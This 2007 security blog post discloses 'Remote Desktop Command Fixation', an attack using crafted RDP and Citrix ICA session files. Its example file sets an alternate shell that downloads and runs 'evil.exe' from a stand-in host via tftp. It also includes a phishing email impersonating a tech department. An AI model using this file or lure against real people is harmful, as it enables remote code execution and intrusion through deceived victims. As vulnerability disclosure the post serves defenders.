---
title: Remote Desktop Command Fixation Attacks
author: pdp
date: Wed, 10 Oct 2007 11:00:42 GMT
template: post.pug
---

The attack is rather simple. All the attacker needs to do is to compose a malicious RDP (for Windows Terminal Services) or ICA (for CITRIX) file and send it to the victim. The victim is persuaded to open the file by double clicking on it. When the connection is established, the user will enter their credentials to login and as such let the attacker in.

Both, RDP and ICA, contain information not only about what servers to connect to but also what applications to launch after successful authentication. These parameters can be modified to suit the attacker needs. In CITRIX we can specify the default shell command by using the parameter **Application** (i.e `Application=calc.exe`). In Windows Remote Desktop we can do exactly the same with the **alternate shell** (i.e `alternate shell:s:cmd.exe`) directive. Here follows a sample ICA file:

    [WFClient]
    Version=1

    [ApplicationServers]
    Connection To Citrix Server=

    [Connection To Citrix Server]
    InitialProgram=**some command here**
    Address=_172.16.3.191_

    ScreenPercent=0

    In Windows Terminal Services, the same can be achieved with the following example:

    screen mode id:i:1
    desktopwidth:i:800
    desktopheight:i:600
    session bpp:i:16
    full address:s:_172.16.3.191_
    compression:i:1
    keyboardhook:i:2
    alternate shell:s:**some command here**
    shell working directory:s:_C:\_
    bitmapcachepersistenable:i:1

    This is all that the attacker needs to know. Let's have a step-by-step look at the attack structure, shall we:

1.  **Compose a malicious Remote Desktop session file:**
    The following example instructs TFTP to connect to **evil.com** and retrieve a file called **evil.exe**. Once the download is completed, the attacker executes **evil.exe** and subsequently terminates the session:
    screen mode id:i:1
    desktopwidth:i:800
    desktopheight:i:600
    session bpp:i:16
    full address:s:_172.16.3.191_
    compression:i:1
    keyboardhook:i:2
    alternate shell:s:**cmd.exe /C "tftp -i evil.com GET evil.exe evil.exe & evil.exe"**
    shell working directory:s:_C:\_
    bitmapcachepersistenable:i:1

2.  **Send email to the victim:**
Here the attacker uses his social engineering skills to persuade the victim into opening and authenticating the session file. This is how it is done:
> Hello John,
> 
>     This is Tim from Tech Department. I was informed that you have some problems with your remote desktop connectivity. I've attached a modified RDP file you can tryout and see if it works. Just double click on the file and login. Your domain credentials should work. Let me know if you have any problems.
> 
>     Tim O'Brian
> Tech Department
3.  **Own it:**
The attacker notices a new entry in his TFTP log files. The operation was successful. Now he can take full advantage of his brand new asset. "Simple tricks always work."

_This is it. This is what I would like to refer to as "Remote Desktop Command Fixation Attacks". They are simple, highly affective, unknown to system administrators (as of yet), and pretty vicious. Keep in mind that the same procedure apply to CITIRX as well._
